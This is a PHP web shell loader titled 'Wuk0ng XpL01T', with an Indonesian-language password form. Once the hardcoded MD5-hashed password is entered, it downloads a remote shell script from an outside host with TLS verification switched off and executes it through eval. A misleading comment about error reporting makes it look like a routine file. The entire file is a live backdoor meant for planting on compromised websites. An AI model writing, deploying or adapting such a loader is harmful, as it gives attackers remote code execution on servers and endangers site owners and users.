<?php
session_start();

/**
 * Disable error reporting
 *
 * Set this to error_reporting( -1 ) for debugging.
 */
function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

        // Set cookies using session if available
        if (isset($_SESSION['coki'])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['coki']);
        }

        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in()
{
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Check if the WUKONG is submitted and correct
if (isset($_POST['WUKONG'])) {
    $entered_WUKONG = $_POST['WUKONG'];
    $hashed_WUKONG = 'c093dc91971d9e40fd06d0a4227dcd0c';
    if (md5($entered_WUKONG) === $hashed_WUKONG) {
        $_SESSION['logged_in'] = true;
        $_SESSION['coki'] = 'asu';
    } else {
        
        echo "Uupsss 🤭 Wukong Tidak Disitu!";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo('https://wukong.com.ng/shellwukong.txt');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Wuk0ng XpL01T</title>
    </head>
    <body>
        <form method="POST" action="">
            <label for="WUKONG">Apakah Kalian Tahu Keberadaan Wukong ?</label>
            <input type="password" display="none" id="WUKONG" name="WUKONG">
            <input type="submit" value="Cari">
        </form>
    </body>
    </html>
    <?php
}
?>
